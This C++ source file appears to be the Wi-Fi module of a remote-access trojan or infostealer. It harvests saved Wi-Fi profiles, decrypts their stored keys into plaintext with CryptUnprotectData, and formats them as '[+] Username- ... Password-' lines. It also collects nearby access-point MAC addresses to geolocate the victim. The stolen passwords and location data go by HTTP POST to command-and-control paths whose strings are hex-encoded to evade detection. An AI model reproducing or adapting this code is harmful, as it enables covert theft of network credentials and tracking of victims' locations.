#include "Wifi.h"
#include "json/json.h"
using namespace Json;

void Wifi::EnumerateWifi()
{
	int end = 10;
	char mac[32];
	int dwClientVersion = 2;
	char* pReserved = NULL;
	DWORD pdwNegotiatedVersion;
	HANDLE phClientHandle = NULL;
	int ERROR_TYPE;
	PWLAN_INTERFACE_INFO_LIST pInterfaceList;
	PWLAN_BSS_LIST pWlanBssList;
	DOT11_SSID dot11Ssid = { 0 };
	DOT11_BSS_TYPE dot11BssType = dot11_BSS_type_any;
	ERROR_TYPE = WlanOpenHandle(dwClientVersion, pReserved, &pdwNegotiatedVersion, &phClientHandle);
	if (ERROR_TYPE != ERROR_SUCCESS)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	ERROR_TYPE = WlanEnumInterfaces(phClientHandle, pReserved, &pInterfaceList);
	if (ERROR_TYPE != ERROR_SUCCESS)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	ERROR_TYPE = WlanGetNetworkBssList(phClientHandle, &pInterfaceList[0].InterfaceInfo[0].InterfaceGuid, NULL, dot11BssType, NULL,
		pReserved, &pWlanBssList);
	if (ERROR_TYPE != ERROR_SUCCESS)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	if (pWlanBssList->dwNumberOfItems > 0)
	{
		if (pWlanBssList->dwNumberOfItems < 10) {
			end = pWlanBssList->dwNumberOfItems;
		}
		for (int i = 0; i < end; i++)
		{
			sprintf_s(mac, "%02x:%02x:%02x:%02x:%02x:%02x",
				pWlanBssList->wlanBssEntries[i].dot11Bssid[0],
				pWlanBssList->wlanBssEntries[i].dot11Bssid[1],
				pWlanBssList->wlanBssEntries[i].dot11Bssid[2],
				pWlanBssList->wlanBssEntries[i].dot11Bssid[3],
				pWlanBssList->wlanBssEntries[i].dot11Bssid[4],
				pWlanBssList->wlanBssEntries[i].dot11Bssid[5]);
			networks[i].macAddress = mac;
			networks[i].signal = pWlanBssList->wlanBssEntries[i].lRssi;
		}
	}
}

string Wifi::GetLocation()
{
	string tempDomain = Encryptions::hexToAscii("7777772e676f6f676c65617069732e636f6d");
	wstring domain(tempDomain.begin(), tempDomain.end());
	string location = "";
	HINTERNET session = WinHttpRequests.createFirstConnection(domain.c_str());
	string data;
	Value finalJson;
	int numOfNetworks = sizeof(networks) / sizeof(networks[0]);
	if (numOfNetworks > 1)
	{
		Value tempArray = Value::null;
		Value networkJson;
		finalJson["considerIp"] = false;
		data = Encryptions::hexToAscii("7b22636f6e73696465724970223a2066616c73652c202277696669416363657373506f696e747322203a205b");
		for (int i = 0; i < numOfNetworks; i++)
		{
			networkJson["macAddress"] = networks[i].macAddress;
			networkJson["signalStrength"] = to_string(networks[i].signal);
			tempArray.append(networkJson);
			networkJson = Value::null;
		}
		finalJson["wifiAccessPoints"] = tempArray;
	}
	return finalJson.toStyledString();
}

CString Wifi::StringToHexString(CString cs)
{
	CString ret, tmp;
	for (int i = 0; i < cs.GetLength(); ++i)
	{
		unsigned char c = cs[i];
		tmp.Format(L"%X", c);
		ret += tmp;
	}
	return ret;
}

void Wifi::GetWifiPasswords()
{
	string buffer;
	int nResCount = 1;
	if (CoInitializeEx(NULL, 0) != S_OK)
		return;
	bool result = false;
	HANDLE hWlan;
	DWORD dwIgnored = 0;
	DWORD dwResult = WlanOpenHandle(1, NULL, &dwIgnored, &hWlan);
	if (dwResult != ERROR_SUCCESS)
		return;
	WLAN_INTERFACE_INFO_LIST* pWirelessAdapterList = NULL;
	dwResult = WlanEnumInterfaces(hWlan, NULL, &pWirelessAdapterList);
	if (dwResult != ERROR_SUCCESS)
	{
		WlanCloseHandle(hWlan, NULL);
		return;
	}
	WLAN_INTERFACE_INFO* pWirelessAdapterInfo = NULL;
	result = true;
	for (DWORD i = 0; i < pWirelessAdapterList->dwNumberOfItems; i++)
	{
		pWirelessAdapterInfo = &pWirelessAdapterList->InterfaceInfo[i];
		WLAN_PROFILE_INFO_LIST* pProfileList;
		dwResult = WlanGetProfileList(hWlan, &pWirelessAdapterInfo->InterfaceGuid, NULL, &pProfileList);
		if (dwResult != ERROR_SUCCESS)
			continue;
		for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++)
		{
			WLAN_PROFILE_INFO* pProfileInfo = &pProfileList->ProfileInfo[j];
			LPWSTR lpszXmlProfile;
			DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY | WLAN_PROFILE_USER;
			DWORD dwAccess = WLAN_READ_ACCESS;

			dwResult = WlanGetProfile(hWlan, &pWirelessAdapterInfo->InterfaceGuid, pProfileInfo->strProfileName, NULL,
				&lpszXmlProfile, &dwFlags, &dwAccess);
			if (dwResult == ERROR_SUCCESS)
			{
				CString strXml = lpszXmlProfile;
				WlanFreeMemory(lpszXmlProfile);
				int nFirstIndex = strXml.Find(L"<SSID>");
				int nLastIndex = strXml.Find(L"</SSID>");
				CString strSSID = CString(((LPCTSTR)strXml) + nFirstIndex, nLastIndex - nFirstIndex);
				nFirstIndex = strSSID.Find(L"<name>");
				nLastIndex = strSSID.Find(L"</name>");
				strSSID = CString(((LPCTSTR)strSSID) + nFirstIndex + 6, nLastIndex - (nFirstIndex + 6));
				nFirstIndex = strXml.Find(L"<authentication>");
				nLastIndex = strXml.Find(L"</authentication>");
				CString strAuth = CString(((LPCTSTR)strXml) + nFirstIndex + 16, nLastIndex - (nFirstIndex + 16));
				nFirstIndex = strXml.Find(L"<encryption>");
				nLastIndex = strXml.Find(L"</encryption>");
				CString strEnc = CString(((LPCTSTR)strXml) + nFirstIndex + 12, nLastIndex - (nFirstIndex + 12));
				CString strKey;
				nFirstIndex = strXml.Find(_T("<keyMaterial>"));
				if (nFirstIndex != -1)
				{
					nLastIndex = strXml.Find(_T("</keyMaterial>"));
					strKey = CString(((LPCTSTR)strXml) + nFirstIndex + 13, nLastIndex - (nFirstIndex + 13));
					BYTE byteKey[1024] = { 0 };
					DWORD dwLength = 1024;
					DATA_BLOB dataOut, dataVerify;
					BOOL bRes = CryptStringToBinary(strKey, strKey.GetLength(), CRYPT_STRING_HEX, byteKey, &dwLength, 0, 0);

					if (bRes)
					{
						dataOut.cbData = dwLength;
						dataOut.pbData = (BYTE*)byteKey;

						if (CryptUnprotectData(&dataOut, NULL, NULL, NULL, NULL, 0, &dataVerify))
						{
							TCHAR str[MAX_PATH] = { 0 };
							wsprintf(str, L"%hs", dataVerify.pbData);
							strKey = str;
						}
					}
				}
				CString strSpace;
				WCHAR network[1024];
				WCHAR user[1024];
				WCHAR pass[1024];
				wcsncpy_s(network, _countof(network), strSSID, _TRUNCATE);
				wcsncpy_s(user, _countof(user), strAuth, _TRUNCATE);
				wcsncpy_s(pass, _countof(pass), strKey, _TRUNCATE);
				CString HexPassword = StringToHexString(pass);
				wstring ws(network);
				string network2(ws.begin(), ws.end());
				ws = pass;
				string password2(ws.begin(), ws.end());
				buffer += Encryptions::hexToAscii("5b2b5d20557365726e616d652d20");
				buffer += string(network2);
				buffer += "  Password- " + string(password2) + "\\n";
				nResCount++;
			}
		}
		WlanFreeMemory(pProfileList);
	}
	WlanFreeMemory(pWirelessAdapterList);
	WlanCloseHandle(hWlan, NULL);
	allPasswords = buffer;
}

bool Wifi::GetWifiStatus()
{
	HANDLE hClient = NULL;
	DWORD dwMaxClient = 2;
	DWORD dwCurVersion = 0;
	DWORD dwResult = 0;
	DWORD dwRetVal = 0;
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	int iRSSI = 0;
	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
	if (dwResult != ERROR_SUCCESS) {
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
	if (dwResult != ERROR_SUCCESS) {
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	if (pIfList->dwNumberOfItems > 0)
		return true;
	else
		return false;
}

void Wifi::SendLocationThread(PublicStructers::ClientSession session)
{
	EnumerateWifi();
	string metaData = GetLocation();
	string finalData = JsonFunctions::CreatePostJson(metaData, true);
	if (networks[0].macAddress != "")
		WinHttpRequests.SendPostData(finalData, session.session, Encryptions::hexToAscii("2F746F6F6C2F617574682F6C6F636174696F6E"), session.clientId);
}

void Wifi::GetWifiPasswordsThread(PublicStructers::client clientInfo)
{
	string finalData;
	try
	{
		GetWifiPasswords();
		if (allPasswords.empty())
			finalData = Encryptions::hexToAscii("4E6F207769666920696E746572666163657320666F756E64");
		else
			finalData = allPasswords;

	}
	catch (exception)
	{
		finalData = Encryptions::hexToAscii("5b2d5d20556e61626c6520746f2067617468657220776966692070617373776f7264732c20");
	}
	WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
}